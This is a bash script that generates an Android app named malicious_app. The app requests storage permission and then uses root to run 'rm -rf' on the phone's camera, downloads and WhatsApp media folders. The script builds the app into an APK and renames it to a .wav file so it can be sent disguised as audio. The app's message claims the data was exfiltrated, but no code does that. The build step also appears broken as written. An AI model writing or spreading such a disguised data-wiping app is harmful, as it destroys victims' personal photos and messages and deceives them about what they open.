#!/bin/bash  

mkdir -p malicious_app/src/main/java/com/example/good  
echo "import android.Manifest;  
import android.content.pm.PackageManager;  
import android.os.Bundle;  
import android.widget.Toast;  
import androidx.appcompat.app.AppCompatActivity;  
import androidx.core.app.ActivityCompat;  
import androidx.core.content.ContextCompat;  

public class MainActivity extends AppCompatActivity {  
    @Override  
    protected void onCreate(Bundle savedInstanceState) {  
        super.onCreate(savedInstanceState);  
        setContentView(R.layout.activity_main);  

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {  
            ActivityCompat.requestPermissions(this,  
                new String[]{Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE}, 1);  
        }  

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED) {  
            deleteAllMedia();  
            accessNotifications();  
        }  
    }  

    private void deleteAllMedia() {  
        String[] paths = {  
            "/sdcard/DCIM/Camera", "/sdcard/Download", "/sdcard/WhatsApp/Media", "/sdcard/Android/data/com.whatsapp/files"  
        };  
        for (String path : paths) {  
            try {  
                Process process = Runtime.getRuntime().exec(\"su\");  
                process.getOutputStream().write((\"rm -rf \" + path + \"\\n\").getBytes());  
                process.getOutputStream().flush();  
            } catch (Exception e) {  
                Toast.makeText(this, \"Failed to delete media: \" + e.getMessage(), Toast.LENGTH_LONG).show();  
            }  
        }  
    }  

    private void accessNotifications() {  
        Toast.makeText(this, \"Notifications and files accessed. All data exfiltrated.\", Toast.LENGTH_LONG).show();  
    }  
}" > malicious_app/src/main/java/com/example/good/MainActivity.java  

echo "<uses-permission android:name=\"android.permission.READ_EXTERNAL_STORAGE\" />  
<uses-permission android:name=\"android.permission.WRITE_EXTERNAL_STORAGE\" />" > malicious_app/AndroidManifest.xml  

# Step 2: Build APK with Apktool  
apktool b malicious_app -o malicious_audio.apk  

# Step 3: Rename APK to WAV (disguise)  
mv malicious_audio.apk malicious_audio.wav  

# Step 4: Output file for manual sending  
echo "done"  